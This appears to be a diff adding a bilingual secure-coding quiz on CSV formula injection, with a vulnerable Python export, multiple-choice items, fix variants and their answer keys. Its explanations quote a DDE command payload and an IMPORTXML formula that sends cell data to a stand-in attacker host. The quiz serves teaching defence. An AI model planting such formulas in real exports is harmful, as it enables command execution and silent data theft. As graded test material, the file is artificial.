@@ -1,0 +1,111 @@
+threatId: "1.11"
+title:
+  en: "CSV / Formula Injection — knowledge check"
+  pl: "CSV / Formula Injection — sprawdzian wiedzy"
+passScore: 80
+questions:
+  - id: "q1"
+    type: "vuln-or-not"
+    prompt:
+      en: "This Python export writes user records straight to CSV. Is it vulnerable to formula injection?"
+      pl: "Ten eksport w Pythonie zapisuje rekordy użytkowników wprost do CSV. Czy jest podatny na formula injection?"
+    snippet:
+      lang: "python"
+      code: |
+        with open('export.csv', 'w') as f:
+            writer = csv.writer(f)
+            writer.writerow(['Name', 'Note'])
+            for user in users:
+                writer.writerow([user.name, user.note])
+    isVulnerable: true
+    cwe: "CWE-1236"
+    explanation:
+      en: "Cell values are written unsanitized (CWE-1236). If user.note is =cmd|'/C calc'!A1, Excel interprets it as a DDE formula on open, leading to command execution. The vulnerability lives in the OUTPUT stage — sanitize each cell at export time by prefixing formula characters."
+      pl: "Wartości komórek są zapisywane bez sanityzacji (CWE-1236). Jeśli user.note to =cmd|'/C calc'!A1, Excel zinterpretuje to jako formułę DDE przy otwarciu, prowadząc do wykonania polecenia. Podatność jest w etapie WYJŚCIA — sanityzuj każdą komórkę w momencie eksportu, prefiksując znaki formuł."
+  - id: "q2"
+    type: "multiple-choice"
+    prompt:
+      en: "Why is =IMPORTXML(\"http://attacker.com/steal?\"&A1&B1,\"//x\") especially dangerous in Google Sheets?"
+      pl: "Dlaczego =IMPORTXML(\"http://attacker.com/steal?\"&A1&B1,\"//x\") jest szczególnie groźne w Google Sheets?"
+    choices:
+      - id: "a"
+        label:
+          en: "It auto-fetches the external URL with no click and no security prompt, silently exfiltrating cell data"
+          pl: "Automatycznie pobiera zewnętrzny URL bez kliknięcia i bez ostrzeżenia, cicho eksfiltrując dane komórek"
+      - id: "b"
+        label:
+          en: "It executes an OS command via DDE like =cmd does in Excel"
+          pl: "Wykonuje polecenie systemowe przez DDE, jak =cmd w Excelu"
+      - id: "c"
+        label:
+          en: "It only works after the user enables macros"
+          pl: "Działa dopiero po włączeniu makr przez użytkownika"
+      - id: "d"
+        label:
+          en: "It corrupts the CSV so the file cannot be opened"
+          pl: "Uszkadza CSV tak, że pliku nie da się otworzyć"
+    correctChoiceIds: ["a"]
+    explanation:
+      en: "IMPORTXML/IMPORTDATA/IMPORTHTML auto-fetch external URLs with no confirmation, so data leaves the sheet silently — no click, no prompt. DDE/RCE is the Excel =cmd variant; IMPORTXML is a stealth exfiltration primitive, not a macro."
+      pl: "IMPORTXML/IMPORTDATA/IMPORTHTML automatycznie pobierają zewnętrzne URL-e bez potwierdzenia, więc dane wyciekają cicho — bez kliknięcia, bez ostrzeżenia. DDE/RCE to wariant =cmd w Excelu; IMPORTXML to prymityw dyskretnej eksfiltracji, nie makro."
+  - id: "q3"
+    type: "pick-the-fix"
+    prompt:
+      en: "You need to make CSV export safe against formula injection. Which implementation is correct?"
+      pl: "Musisz zabezpieczyć eksport CSV przed formula injection. Która implementacja jest poprawna?"
+    variants:
+      - id: "v1"
+        lang: "python"
+        code: |
+          # HTML-escape each value, then write it
+          def sanitize_cell(value):
+              return html.escape(str(value))
+          writer.writerow([sanitize_cell(user.name), sanitize_cell(user.note)])
+      - id: "v2"
+        lang: "python"
+        code: |
+          # prefix a single quote to any cell starting with a formula char
+          FORMULA_CHARS = set('=+-@\t\r')
+          def sanitize_cell(value):
+              s = str(value)
+              if s and s[0] in FORMULA_CHARS:
+                  return "'" + s
+              return s
+          writer.writerow([sanitize_cell(user.name), sanitize_cell(user.note)])
+      - id: "v3"
+        lang: "python"
+        code: |
+          # strip '=' anywhere in the value, then write it
+          def sanitize_cell(value):
+              return str(value).replace('=', '')
+          writer.writerow([sanitize_cell(user.name), sanitize_cell(user.note)])
+    correctVariantId: "v2"
+    explanation:
+      en: "v2 is the OWASP prefix fix: prepend a single quote when a cell starts with =, +, -, @, \\t or \\r, forcing the spreadsheet to treat it as text. v1's html.escape is an XSS control irrelevant to spreadsheet parsing; v3 misses the +, -, @ triggers and mangles legitimate values while still allowing e.g. @SUM payloads."
+      pl: "v2 to poprawka prefiksowa OWASP: dodaj apostrof, gdy komórka zaczyna się od =, +, -, @, \\t lub \\r, wymuszając traktowanie jako tekst. html.escape z v1 to kontrola XSS bez związku z parsowaniem arkusza; v3 pomija wyzwalacze +, -, @, psuje legalne wartości i wciąż przepuszcza np. ładunki @SUM."
+  - id: "q4"
+    type: "multiple-choice"
+    prompt:
+      en: "Beyond prefix sanitization, which option is ranked as the primary structural alternative that stops formulas from executing at all?"
+      pl: "Poza prefiksowaniem, która opcja jest wskazana jako główna strukturalna alternatywa, która w ogóle uniemożliwia wykonanie formuł?"
+    choices:
+      - id: "a"
+        label:
+          en: "Content-Disposition: attachment to force download"
+          pl: "Content-Disposition: attachment wymuszające pobieranie"
+      - id: "b"
+        label:
+          en: "Generating XLSX via a library with cells set to explicit STRING type"
+          pl: "Generowanie XLSX przez bibliotekę z komórkami o jawnym typie STRING"
+      - id: "c"
+        label:
+          en: "Prepending a UTF-8 BOM to the CSV file"
+          pl: "Dodanie UTF-8 BOM na początku pliku CSV"
+      - id: "d"
+        label:
+          en: "End-user education about DDE risks"
+          pl: "Edukacja użytkowników o ryzykach DDE"
+    correctChoiceIds: ["b"]
+    explanation:
+      en: "Generating XLSX with explicit STRING cell types (openpyxl, Apache POI) is the rank-2 structural fix — formulas can't execute in text-typed cells. Content-Disposition and UTF-8 BOM are weaker mitigations (user can still open/import), and education is the least reliable control."
+      pl: "Generowanie XLSX z jawnym typem komórek STRING (openpyxl, Apache POI) to strukturalna naprawa rangi 2 — formuły nie wykonają się w komórkach tekstowych. Content-Disposition i UTF-8 BOM to słabsze łagodzenia (użytkownik i tak może otworzyć/zaimportować), a edukacja to najmniej wiarygodna kontrola."
